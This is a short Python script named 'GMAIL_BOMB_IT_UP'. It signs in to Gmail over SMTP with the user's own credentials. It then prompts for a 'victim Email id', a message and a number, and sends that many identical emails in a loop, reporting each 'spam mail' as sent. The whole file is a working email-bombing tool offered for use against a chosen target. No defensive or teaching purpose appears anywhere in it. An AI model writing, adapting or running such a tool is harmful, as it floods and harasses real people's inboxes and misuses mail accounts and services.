# GMAIL_BOMB_IT_UP
# done by Sri_Programmer
# python v3.7.2

__author__ = 'Sri Manikanta Palakollu.'

# Imports

import smtplib
import platform
import getpass
from termcolor import colored, cprint
import sys
import datetime

mail_server = input("Enter Your Mail Server : ")
if mail_server.lower() == 'gmail':

		try:
			cprint('Trying to Connect the server...!',color='magenta',attrs=['bold'])
			server = smtplib.SMTP('smtp.gmail.com',587)
			server.starttls()
		except smtplib.SMTPConnectError:
			cprint('Internet Connectivity issue : Please Check your internet connection',color='red',attrs=['bold','blink'])
			sys.exit(0)
		except ConnectionResetError:
			cprint('Connection was Reset by peer',color='red',attrs=['bold'])
			sys.exit(0)
		except smtplib.SMTPServerDisconnected:
			cprint('Server disconnected',color='red',attrs=['bold'])
			sys.exit(0)
		
		'''except Exception:
			print('Main Exception')
			sys.exit(0)'''

		emailid     = input("Enter Your Email id : ")	# User Mailid
		password  = getpass.getpass("Enter your Email Password:")	# User Mail Password

		if not emailid and not password:
			cprint('Please Enter valid Emailid and Password.', color='red',attrs=['bold']) 
		else:
			try:
				server.login(emailid,password)

			except smtplib.SMTPAuthenticationError:
				cprint('Authentication Error',color='red',attrs=['bold'])
				sys.exit(0)
			except smtplib.SMTPConnectError:
				cprint('Internet Connectivity issue: Please Check your internet connection',color='red',attrs=['bold'])

			cprint('Sucessfully Signed in',color='green',attrs=['bold'])

			sender_emailid = input('Enter victim Email id:')

			message = input("Enter Your Message :\n")

			mail_count = int(input('Enter the number of mails you want to send: '))

			try:
				for count in range(int(mail_count)):
					server.sendmail(emailid,sender_emailid,message)
					if(count < 1):
						print ("{} spam mail send successfully! : ".format(count + 1))
					else:
						print ("{} spam mail's send successfully! : ".format(count + 1))

			except smtplib.SMTPSenderRefused:
				cprint('Sender Refused to Send the Mail:Something went wrong',color='red',attrs=['bold'])
				sys.exit(0)
			except smtplib.SMTPRecipientsRefused:
				cprint('Recipients Refused Error: Something went wrong.',color='red',attrs=['bold'])
				sys.exit(0)
			except Exception:
				cprint('Something went wrong while sending mail.')

			server.quit()

else:
		cprint("You Must Choose 'gmail' Server",color='red',attrs=['bold'])				
